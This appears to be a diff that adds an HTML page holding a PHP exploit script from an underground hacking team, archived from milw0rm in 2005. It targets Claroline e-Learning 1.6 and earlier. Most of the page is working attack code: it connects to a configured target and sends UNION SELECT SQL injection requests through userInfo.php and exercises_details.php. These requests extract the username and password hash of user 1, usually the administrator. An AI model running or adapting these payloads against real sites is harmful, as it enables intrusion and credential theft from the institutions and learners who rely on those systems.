@@ -1,0 +1,73 @@
+<html>
+<head>
+<title>Claroline e-Learning <= 1.6 Remote Hash SQL Injection Exploit</title>
+<pre>
+&lt;?php
+#############################################################################
+#    T r a p - S e t   U n d e r g r o u n d   H a c k i n g   T e a m
+#############################################################################
+# Vulnerable:   Claroline E-Learning Application
+#
+# Exploit By :  MH_p0rtal
+#
+# Discovered By: Sieg Fried
+#
+#############################################################################
+#  Gr33tz To ==&gt;   Alpha_programmer , Oil_karchack , Dr_CephaleX , Str0ke
+#
+#  And Iranian Hacking &amp; Security Teams :
+#  IHS TeaM , alphaST , Shabgard Security Team  , Emperor Hacking Team  ,
+#  Crouz Security Team  &amp; Simorgh-ev Security Team
+#############################################################################
+# ___________Config :
+# please replace your address :
+$url = &quot;http:///www.example.com&quot;;
+# Please replace your name file  ( userInfo.php Or  exercises_details.php )
+$file1 = &quot;userInfo.php&quot;;
+# please replace your dir address :
+$dirs = &quot;/dir/to/claroline/user/&quot;;
+# __________End Config
+#############################################################################
+if ( $file1 == &quot;userInfo.php&quot; ) {
+$merg = $dirs.$file1;
+$fc = fsockopen(&quot;$url&quot;, 80, $errno, $errstr, 30);
+if (!$fc) {
+
+echo &quot;Can't Connect\n&quot;;
+} else {
+   $mh = &quot;GET $merg?uInfo=-1%20UNION%20SELECT%20username,password,0,0,0,0,0%20from%20user%20where%20user_id=1/*  HTTP/1.1\r\n&quot;;
+   $mh .= &quot;Host: $url\r\n&quot;;
+   $mh .= &quot;Connection: Close\r\n\r\n&quot;;
+
+  fwrite($fc, $mh);
+  while (!feof($fc)) {
+  echo fgets($fc, 1024);
+  }
+   fclose($fc);
+}
+}
+//-------------------------------------------------------------------------------------------
+if ( $file1 == &quot;exercises_details.php&quot; ) {
+$merg = $dirs.$file1;
+$fc = fsockopen(&quot;$url&quot;, 80, $errno, $errstr, 30);
+if (!$fc) {
+
+echo &quot;Can't Connect\n&quot;;
+} else {
+   $mh = &quot;GET $merg?exo_id=-1/**/UNION/**/SELECT%200,password,username,0,0,0%20from%20user%20where%20user_id=1--  HTTP/1.1\r\n&quot;;
+   $mh .= &quot;Host: $url\r\n&quot;;
+   $mh .= &quot;Connection: Close\r\n\r\n&quot;;
+
+  fwrite($fc, $mh);
+  while (!feof($fc)) {
+  echo fgets($fc, 1024);
+  }
+   fclose($fc);
+}
+}
+?&gt;
+
+// milw0rm.com [2005-06-17]
+</pre>
+</html>
+
